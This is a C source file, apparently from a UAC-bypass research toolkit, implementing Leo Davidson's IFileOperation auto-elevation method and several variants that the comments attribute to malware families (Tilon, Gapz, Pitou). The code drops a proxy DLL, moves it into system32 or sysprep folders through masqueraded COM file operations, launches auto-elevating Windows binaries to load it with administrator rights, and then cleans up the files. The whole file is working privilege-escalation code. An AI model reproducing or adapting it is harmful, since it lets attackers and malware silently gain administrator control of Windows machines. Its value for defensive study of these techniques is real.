/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2019
*
*  TITLE:       PITOU.C
*
*  VERSION:     3.18
*
*  DATE:        29 Mar 2019
*
*  Leo Davidson based IFileOperation auto-elevation.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmSysprepMethodsCleanup
*
* Purpose:
*
* Post execution cleanup routine for sysprep methods.
*
*/
BOOL ucmSysprepMethodsCleanup(
    UCM_METHOD Method
)
{
    BOOL bResult;
    LPWSTR lpTarget;
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);

    if (Method == UacMethodSysprep4) {

        _strcat(szBuffer, OOBE_EXE);
        bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
        if (bResult) {
            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, UNBCL_DLL);
            bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
        }
        return (bResult);

    }
    else {

        _strcat(szBuffer, SYSPREP_DIR);

        switch (Method) {

        case UacMethodSysprep1:
            lpTarget = CRYPTBASE_DLL;
            break;

        case UacMethodSysprep2:
            lpTarget = SHCORE_DLL;
            break;

        case UacMethodSysprep3:
            lpTarget = DBGCORE_DLL;
            break;

        case UacMethodSysprep5:
            lpTarget = UNATTEND_DLL;
            break;

        case UacMethodTilon:
            lpTarget = ACTIONQUEUE_DLL;
            break;

        default:
            return FALSE;
        }

        _strcat(szBuffer, lpTarget);

        return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
    }
}

/*
* ucmOobeMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for OobeMethod.
*
*/
BOOL ucmOobeMethodCleanup(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    //%systemroot%\system32\oobe\"
    _strcat(szBuffer, L"oobe\\");
    _strcat(szBuffer, WDSCORE_DLL);

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmStandardAutoElevation2
*
* Purpose:
*
* Bypass UAC by abusing appinfo g_lpAutoApproveEXEList
*
* UAC contain whitelist of trusted fusion processes with only names and no other special restrictions.
*
*/
NTSTATUS ucmStandardAutoElevation2(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR SourceFilePathAndName[MAX_PATH + 1];
    WCHAR DestinationFilePathAndName[MAX_PATH + 1];

    do {

        //source filename of dll
        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
        _strcpy(SourceFilePathAndName, g_ctx->szTempDirectory);
        _strcat(SourceFilePathAndName, UNBCL_DLL);

        if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize)) {
            MethodResult = STATUS_UNSUCCESSFUL;
            break;
        }

        //copy %temp\unbcl.dll -> system32\unbcl.dll
        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx->szSystemDirectory)) {
            MethodResult = STATUS_UNSUCCESSFUL;
            break;
        }

        //source filename of process
        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
        _strcpy(SourceFilePathAndName, g_ctx->szSystemDirectory);
        _strcat(SourceFilePathAndName, SYSPREP_DIR);
        _strcat(SourceFilePathAndName, SYSPREP_EXE);

        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
        _strcpy(DestinationFilePathAndName, g_ctx->szTempDirectory);
        _strcat(DestinationFilePathAndName, OOBE_EXE);

        //system32\sysprep\sysprep.exe -> temp\oobe.exe
        if (!CopyFile(SourceFilePathAndName, DestinationFilePathAndName, FALSE)) {
            MethodResult = STATUS_UNSUCCESSFUL;
            break;
        }

        //temp\oobe.exe -> system32\oobe.exe
        if (!ucmMasqueradedMoveFileCOM(DestinationFilePathAndName, g_ctx->szSystemDirectory)) {
            MethodResult = STATUS_ACCESS_DENIED;
            break;
        }

        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
        _strcpy(DestinationFilePathAndName, g_ctx->szSystemDirectory);
        _strcat(DestinationFilePathAndName, OOBE_EXE);

        if (supRunProcess(DestinationFilePathAndName, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    return MethodResult;
}

/*
* ucmStandardAutoElevation
*
* Purpose:
*
* Leo Davidson AutoElevation method with derivatives.
*
* UacMethodSysprep1   - Original Leo Davidson concept.
* UacMethodSysprep2   - Windows 8.1 adapted UacMethodSysprep1 (bypassing sysprep embedded manifest dlls redirection).
* UacMethodTilon      - Leo Davidson concept with different target dll, used by Win32/Tilon.
* UacMethodSysprep3   - Windows 10 TH1 adapted UacMethodSysprep1.
* UacMethodSysprep5   - Leo Davidson concept with different target dll, used by 0kit/Gapz.
* UacMethodOobe       - WinNT/Pitou derivative from Leo Davidson concept.
*
*/
NTSTATUS ucmStandardAutoElevation(
    _In_ UCM_METHOD Method,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
    WCHAR       szSourceDll[MAX_PATH * 2];
    WCHAR       szTargetDir[MAX_PATH * 2];
    WCHAR       szTargetProcess[MAX_PATH * 2];


    _strcpy(szSourceDll, g_ctx->szTempDirectory);
    _strcpy(szTargetDir, g_ctx->szSystemDirectory);
    _strcpy(szTargetProcess, g_ctx->szSystemDirectory);

    switch (Method) {

    case UacMethodSysprep1:

        //%temp%\cryptbase.dll
        _strcat(szSourceDll, CRYPTBASE_DLL);

        //%systemroot%\system32\sysprep      
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe    
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep2:

        //%temp\\shcore.dll
        _strcat(szSourceDll, SHCORE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep3:

        //%temp%\dbgcore.dll
        _strcat(szSourceDll, DBGCORE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodOobe:

        //%temp%\wdscore.dll
        _strcat(szSourceDll, WDSCORE_DLL);

        //%systemroot%\system32\oobe\"
        _strcat(szTargetDir, L"oobe\\");

        //%systemroot%\system32\oobe\setupsqm.exe
        _strcat(szTargetProcess, SETUPSQM_EXE);

        break;

    case UacMethodTilon:

        //%temp%\ActionQueue.dll
        _strcat(szSourceDll, ACTIONQUEUE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep5:

        //%temp%\Unattend.dll
        _strcat(szSourceDll, UNATTEND_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    default:
        return ERROR_INVALID_PARAMETER;
    }

    do {

        if (!supWriteBufferToFile(szSourceDll, ProxyDll, ProxyDllSize)) {
            MethodResult = STATUS_UNSUCCESSFUL;
            break;
        }

        if (!ucmMasqueradedMoveFileCOM(szSourceDll, szTargetDir)) {
            MethodResult = STATUS_ACCESS_DENIED;
            break;
        }

        if (supRunProcess(szTargetProcess, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    return MethodResult;
}
